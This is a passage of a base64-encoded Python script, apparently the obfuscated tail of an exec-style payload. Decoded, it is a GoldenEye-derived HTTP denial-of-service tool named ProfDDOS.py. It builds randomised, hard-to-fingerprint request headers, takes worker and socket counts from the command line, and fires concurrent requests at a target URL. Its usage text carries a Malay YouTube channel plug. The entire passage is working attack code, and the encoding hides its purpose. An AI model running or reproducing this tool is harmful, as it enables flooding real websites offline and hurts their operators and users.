fcHJlJ10pLCBicm93c2VyX3N0cmluZykKCiAgICAgICAgICAgIHN5c2luZm8gPSAiJXM7ICVzIiAlIChicm93c2VyX3N0cmluZywgc3lzaW5mbykKCiAgICAgICAgICAgIGlmICdleHRfcG9zdCcgaW4gYnJvd3NlcjoKICAgICAgICAgICAgICAgIHN5c2luZm8gPSAiJXM7ICVzIiAlIChzeXNpbmZvLCByYW5kb20uY2hvaWNlKGJyb3dzZXJbJ2V4dF9wb3N0J10pKQoKCiAgICAgICAgaWYgJ2V4dCcgaW4gb3MgYW5kIG9zWydleHQnXToKICAgICAgICAgICAgc3lzaW5mbyA9ICIlczsgJXMiICUgKHN5c2luZm8sIHJhbmRvbS5jaG9pY2Uob3NbJ2V4dCddKSkKCiAgICAgICAgdWFfc3RyaW5nID0gIiVzICglcykiICUgKG1vemlsbGFfdmVyc2lvbiwgc3lzaW5mbykKCiAgICAgICAgaWYgJ25hbWUnIGluIHBsYXRmb3JtIGFuZCBwbGF0Zm9ybVsnbmFtZSddOgogICAgICAgICAgICB1YV9zdHJpbmcgPSAiJXMgJXMiICUgKHVhX3N0cmluZywgcmFuZG9tLmNob2ljZShwbGF0Zm9ybVsnbmFtZSddKSkKCiAgICAgICAgaWYgJ2RldGFpbHMnIGluIHBsYXRmb3JtIGFuZCBwbGF0Zm9ybVsnZGV0YWlscyddOgogICAgICAgICAgICB1YV9zdHJpbmcgPSAiJXMgKCVzKSIgJSAodWFfc3RyaW5nLCByYW5kb20uY2hvaWNlKHBsYXRmb3JtWydkZXRhaWxzJ10pIGlmIGxlbihwbGF0Zm9ybVsnZGV0YWlscyddKSA+IDEgZWxzZSBwbGF0Zm9ybVsnZGV0YWlscyddWzBdICkKCiAgICAgICAgaWYgJ2V4dGVuc2lvbnMnIGluIHBsYXRmb3JtIGFuZCBwbGF0Zm9ybVsnZXh0ZW5zaW9ucyddOgogICAgICAgICAgICB1YV9zdHJpbmcgPSAiJXMgJXMiICUgKHVhX3N0cmluZywgcmFuZG9tLmNob2ljZShwbGF0Zm9ybVsnZXh0ZW5zaW9ucyddKSkKCiAgICAgICAgcmV0dXJuIHVhX3N0cmluZwoKICAgIGRlZiBnZW5lcmF0ZVJhbmRvbUhlYWRlcnMoc2VsZik6CgogICAgICAgICMgUmFuZG9tIG5vLWNhY2hlIGVudHJpZXMKICAgICAgICBub0NhY2hlRGlyZWN0aXZlcyA9IFsnbm8tY2FjaGUnLCAnbWF4LWFnZT0wJ10KICAgICAgICByYW5kb20uc2h1ZmZsZShub0NhY2hlRGlyZWN0aXZlcykKICAgICAgICBuck5vQ2FjaGUgPSByYW5kb20ucmFuZGludCgxLCAobGVuKG5vQ2FjaGVEaXJlY3RpdmVzKS0xKSkKICAgICAgICBub0NhY2hlID0gJywgJy5qb2luKG5vQ2FjaGVEaXJlY3RpdmVzWzpuck5vQ2FjaGVdKQoKICAgICAgICAjIFJhbmRvbSBhY2NlcHQgZW5jb2RpbmcKICAgICAgICBhY2NlcHRFbmNvZGluZyA9IFsnXCdcJycsJyonLCdpZGVudGl0eScsJ2d6aXAnLCdkZWZsYXRlJ10KICAgICAgICByYW5kb20uc2h1ZmZsZShhY2NlcHRFbmNvZGluZykKICAgICAgICBuckVuY29kaW5ncyA9IHJhbmRvbS5yYW5kaW50KDEsaW50KGxlbihhY2NlcHRFbmNvZGluZykvMikpCiAgICAgICAgcm91bmRFbmNvZGluZ3MgPSBhY2NlcHRFbmNvZGluZ1s6bnJFbmNvZGluZ3NdCgogICAgICAgIGh0dHBfaGVhZGVycyA9IHsKICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBzZWxmLmdldFVzZXJBZ2VudCgpLAogICAgICAgICAgICAnQ2FjaGUtQ29udHJvbCc6IG5vQ2FjaGUsCiAgICAgICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnLCAnLmpvaW4ocm91bmRFbmNvZGluZ3MpLAogICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAgICAgJ0tlZXAtQWxpdmUnOiByYW5kb20ucmFuZGludCgxLDEwMDApLAogICAgICAgICAgICAnSG9zdCc6IHNlbGYuaG9zdCwKICAgICAgICB9CgogICAgICAgICMgUmFuZG9tbHktYWRkZWQgaGVhZGVycwogICAgICAgICMgVGhlc2UgaGVhZGVycyBhcmUgb3B0aW9uYWwgYW5kIGFyZQogICAgICAgICMgcmFuZG9tbHkgc2VudCB0aHVzIG1ha2luZyB0aGUKICAgICAgICAjIGhlYWRlciBjb3VudCByYW5kb20gYW5kIHVuZmluZ2VycHJpbnRhYmxlCiAgICAgICAgaWYgcmFuZG9tLnJhbmRyYW5nZSgyKSA9PSAwOgogICAgICAgICAgICAjIFJhbmRvbSBhY2NlcHQtY2hhcnNldAogICAgICAgICAgICBhY2NlcHRDaGFyc2V0ID0gWyAnSVNPLTg4NTktMScsICd1dGYtOCcsICdXaW5kb3dzLTEyNTEnLCAnSVNPLTg4NTktMicsICdJU08tODg1OS0xNScsIF0KICAgICAgICAgICAgcmFuZG9tLnNodWZmbGUoYWNjZXB0Q2hhcnNldCkKICAgICAgICAgICAgaHR0cF9oZWFkZXJzWydBY2NlcHQtQ2hhcnNldCddID0gJ3swfSx7MX07cT17Mn0sKjtxPXszfScuZm9ybWF0KGFjY2VwdENoYXJzZXRbMF0sIGFjY2VwdENoYXJzZXRbMV0scm91bmQocmFuZG9tLnJhbmRvbSgpLCAxKSwgcm91bmQocmFuZG9tLnJhbmRvbSgpLCAxKSkKCiAgICAgICAgaWYgcmFuZG9tLnJhbmRyYW5nZSgyKSA9PSAwOgogICAgICAgICAgICAjIFJhbmRvbSBSZWZlcmVyCiAgICAgICAgICAgIHVybF9wYXJ0ID0gc2VsZi5idWlsZGJsb2NrKHJhbmRvbS5yYW5kaW50KDUsMTApKQoKICAgICAgICAgICAgcmFuZG9tX3JlZmVyZXIgPSByYW5kb20uY2hvaWNlKHNlbGYucmVmZXJlcnMpICsgdXJsX3BhcnQKCiAgICAgICAgICAgIGlmIHJhbmRvbS5yYW5kcmFuZ2UoMikgPT0gMDoKICAgICAgICAgICAgICAgIHJhbmRvbV9yZWZlcmVyID0gcmFuZG9tX3JlZmVyZXIgKyAnPycgKyBzZWxmLmdlbmVyYXRlUXVlcnlTdHJpbmcocmFuZG9tLnJhbmRpbnQoMSwgMTApKQoKICAgICAgICAgICAgaHR0cF9oZWFkZXJzWydSZWZlcmVyJ10gPSByYW5kb21fcmVmZXJlcgoKICAgICAgICBpZiByYW5kb20ucmFuZHJhbmdlKDIpID09IDA6CiAgICAgICAgICAgICMgUmFuZG9tIENvbnRlbnQtVHJ5cGUKICAgICAgICAgICAgaHR0cF9oZWFkZXJzWydDb250ZW50LVR5cGUnXSA9IHJhbmRvbS5jaG9pY2UoWydtdWx0aXBhcnQvZm9ybS1kYXRhJywgJ2FwcGxpY2F0aW9uL3gtdXJsLWVuY29kZWQnXSkKCiAgICAgICAgaWYgcmFuZG9tLnJhbmRyYW5nZSgyKSA9PSAwOgogICAgICAgICAgICAjIFJhbmRvbSBDb29raWUKICAgICAgICAgICAgaHR0cF9oZWFkZXJzWydDb29raWUnXSA9IHNlbGYuZ2VuZXJhdGVRdWVyeVN0cmluZyhyYW5kb20ucmFuZGludCgxLCA1KSkKCiAgICAgICAgcmV0dXJuIGh0dHBfaGVhZGVycwoKICAgICMgSG91c2VrZWVwaW5nCiAgICBkZWYgc3RvcChzZWxmKToKICAgICAgICBzZWxmLnJ1bm5hYmxlID0gRmFsc2UKICAgICAgICBzZWxmLmNsb3NlQ29ubmVjdGlvbnMoKQogICAgICAgIHNlbGYudGVybWluYXRlKCkKCiAgICAjIENvdW50ZXIgRnVuY3Rpb25zCiAgICBkZWYgaW5jQ291bnRlcihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNlbGYuY291bnRlclswXSArPSAxCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwoKICAgIGRlZiBpbmNGYWlsZWQoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLmNvdW50ZXJbMV0gKz0gMQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCgoKIyMjIwoKIyMjIwojIE90aGVyIEZ1bmN0aW9ucwojIyMjCgpkZWYgdXNhZ2UoKToKICAgIHByaW50KCkKICAgIHByaW50KCctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCiAgICBwcmludCgpCiAgICBwcmludChHT0xERU5FWUVfQkFOTkVSKQogICAgcHJpbnQoKQogICAgcHJpbnQoJyBVU0FHRTogLi9Qcm9mRERPUy5weSA8dXJsPiBbT1BUSU9OU10nKQogICAgcHJpbnQoKQogICAgcHJpbnQoJyBPUFRJT05TOicpCiAgICBwcmludCgnXHQgRmxhZ1x0XHRcdERlc2NyaXB0aW9uXHRcdFx0XHRcdFx0RGVmYXVsdCcpCiAgICBwcmludCgnXHQgLXUsIC0tdXNlcmFnZW50c1x0RmlsZSB3aXRoIHVzZXItYWdlbnRzIHRvIHVzZVx0XHRcdFx0KGRlZmF1bHQ6IHJhbmRvbWx5IGdlbmVyYXRlZCknKQogICAgcHJpbnQoJ1x0IC13LCAtLXdvcmtlcnNcdFx0TnVtYmVyIG9mIGNvbmN1cnJlbnQgd29ya2Vyc1x0XHRcdFx0KGRlZmF1bHQ6IHswfSknLmZvcm1hdChERUZBVUxUX1dPUktFUlMpKQogICAgcHJpbnQoJ1x0IC1zLCAtLXNvY2tldHNcdFx0TnVtYmVyIG9mIGNvbmN1cnJlbnQgc29ja2V0c1x0XHRcdFx0KGRlZmF1bHQ6IHswfSknLmZvcm1hdChERUZBVUxUX1NPQ0tFVFMpKQogICAgcHJpbnQoJ1x0IC1tLCAtLW1ldGhvZFx0XHRIVFRQIE1ldGhvZCB0byB1c2UgXCdnZXRcJyBvciBcJ3Bvc3RcJyAgb3IgXCdyYW5kb21cJ1x0XHQoZGVmYXVsdDogZ2V0KScpCiAgICBwcmludCgnXHQgLW4sIC0tbm9zc2xjaGVja1x0RG8gbm90IHZlcmlmeSBTU0wgQ2VydGlmaWNhdGVcdFx0XHRcdChkZWZhdWx0OiBUcnVlKScpCiAgICBwcmludCgnXHQgLWQsIC0tZGVidWdcdFx0RW5hYmxlIERlYnVnIE1vZGUgW21vcmUgdmVyYm9zZSBvdXRwdXRdXHRcdFx0KGRlZmF1bHQ6IEZhbHNlKScpCiAgICBwcmludCgnXHQgLWgsIC0taGVscFx0XHRTaG93cyB0aGlzIGhlbHAnKQogICAgcHJpbnQoKQogICAgcHJpbnQoJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykKCgpkZWYgZXJyb3IobXNnKToKICAgICMgcHJpbnQgaGVscCBpbmZvcm1hdGlvbiBhbmQgZXhpdDoKICAgIHN5cy5zdGRlcnIud3JpdGUoc3RyKG1zZysiXG4iKSkKICAgIHVzYWdlKCkKICAgIHN5cy5leGl0KDIpCgojIyMjCiMgTWFpbgojIyMjCgpkZWYgbWFpbigpOgoKICAgIHRyeToKCiAgICAgICAgaWYgbGVuKHN5cy5hcmd2KSA8IDI6CiAgICAgICAgICAgIGVycm9yKCdKQU5HQU4gTFVQQSBTVVBQT1JUIENIQU5ORUwgWU9VVFVCRSBTQVlBIC1QUk9GRVNPUiBBQ0MtJykKCiAgICAgICAgdXJsID0gc3lzLmFyZ3ZbMV0KCiAgICAgICAgaWYgdXJsID09ICctaCc6CiAgICAgICAgICAgIHVzYWdlKCkKICAgICAgICAgICAgc3lzLmV4aXQoKQoKICAgICAgICBpZiB1cmxbMDo0XS5sb3dlcigpICE9ICdodHRwJzoKICAgICAgICAgICAgZXJyb3IoIkludmFsaWQgVVJMIHN1cHBsaWVkIikKCiAgICAgICAgaWYgdXJsID09IE5vbmU6CiAgICAgICAgICAgIGVycm9yKCJObyBVUkwgc3VwcGxpZWQiKQoKICAgICAgICBvcHRzLCBhcmdzID0gZ2V0b3B0LmdldG9wdChzeXMuYXJndlsyOl0sICJuZGh3OnM6bTp1OiIsIFsibm9zc2xjaGVjayIsICJkZWJ1ZyIsICJoZWxwIiwgIndvcmtlcnMiLCAic29ja2V0cyIsICJtZXRob2QiLCAidXNlcmFnZW50cyIgXSkKCiAgICAgICAgd29ya2VycyA9IERFRkFVTFRfV09SS0VSUwogICAgICAgIHNvY2tzID0gREVGQVVMVF9TT0NLRVRTCiAgICAgICAgbWV0aG9kID0gTUVUSE9EX0dFVAoKICAgICAgICB1YXNfZmlsZSA9IE5vbmUKICAgICAgICB1c2VyYWdlbnRzID0gW10KCiAgICAgICAgZm9yIG8sIGEgaW4gb3B0czoKICAgICAgICAgICAgaWYgbyBpbiAoIi1oIiwgIi0taGVscCIpOgogICAgICAgICAgICAgICAgdXNhZ2UoKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoKQogICAgICAgICAgICBlbGlmIG8gaW4gKCItdSIsICItLXVzZXJhZ2VudHMiKToKICAgICAgICAgICAgICAgIHVhc19maWxlID0gYQogICAgICAgICAgICBlbGlmIG8gaW4gKCItcyIsICItLXNvY2tldHMiKToKICAgICAgICAgICAgICAgIHNvY2tzID0gaW50KGEpCiAgICAgICAgICAgIGVsaWYgbyBpbiAoIi13IiwgIi0td29ya2VycyIpOgogICAgICAgICAgICAgICAgd29ya2VycyA9IGludChhKQogICAgICAgICAgICBlbGlmIG8gaW4gKCItZCIsICItLWRlYnVnIik6CiAgICAgICAgICAgICAgICBnbG9iYWwgREVCVUcKICAgICAgICAgICAgICAgIERFQlVHID0gVHJ1ZQogICAgICAgICAgICBlbGlmIG8gaW4gKCItbiIsICItLW5vc3NsY2hlY2siKToKICAgICAgICAgICAgICAgIGdsb2JhbCBTU0xWRVJJRlkKICAgICAgICAgICAgICAgIFNTTFZFUklGWSA9IEZhbHNlCiAgICAgICAgICAgIGVsaWYgbyBpbiAoIi1tIiwgIi0tbWV0aG9kIik6CiAgICAgICAgICAgICAgICBpZiBhIGluIChNRVRIT0RfR0VULCBNRVRIT0RfUE9TVCwgTUVUSE9EX1JBTkQpOgogICAgICAgICAgICAgICAgICAgIG1ldGhvZCA9IGEKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgZXJyb3IoIm1ldGhvZCB7MH0gaXMgaW52YWxpZCIuZm9ybWF0KGEpKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZXJyb3IoIm9wdGlvbiAnIitvKyInIGRvZXNuJ3QgZXhpc3RzIikKCgogICAgICAgIGlmIHVhc19maWxlOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4odWFzX2ZpbGUpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgdXNlcmFnZW50cyA9IGYucmVhZGxpbmVzKCkKICAgICAgICAgICAgZXhjZXB0IEVudmlyb25tZW50RXJyb3I6CiAgICAgICAgICAgICAgICBlcnJvcigiY2Fubm90IHJlYWQgZmlsZSB7MH0iLmZvcm1hdCh1YXNfZmlsZSkpCgogICAgICAgIGdvbGRlbmV5ZSA9IEdvbGRlbkV5ZSh1cmwpCiAgICAgICAgZ29sZGVuZXllLnVzZXJhZ2VudHMgPSB1c2VyYWdlbnRzCiAgICAgICAgZ29sZGVuZXllLm5yX3dvcmtlcnMgPSB3b3JrZXJzCiAgICAgICAgZ29sZGVuZXllLm1ldGhvZCA9IG1ldGhvZAogICAgICAgIGdvbGRlbmV5ZS5ucl9zb2NrZXRzID0gc29ja3MKCiAgICAgICAgZ29sZGVuZXllLmZpcmUoKQoKICAgIGV4Y2VwdCBnZXRvcHQuR2V0b3B0RXJyb3IgYXMgZXJyOgoKICAgICAgICAjIHByaW50IGhlbHAgaW5mb3JtYXRpb24gYW5kIGV4aXQ6CiAgICAgICAgc3lzLnN0ZGVyci53cml0ZShzdHIoZXJyKSkKICAgICAgICB1c2FnZSgpCiAgICAgICAgc3lzLmV4aXQoMikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK'))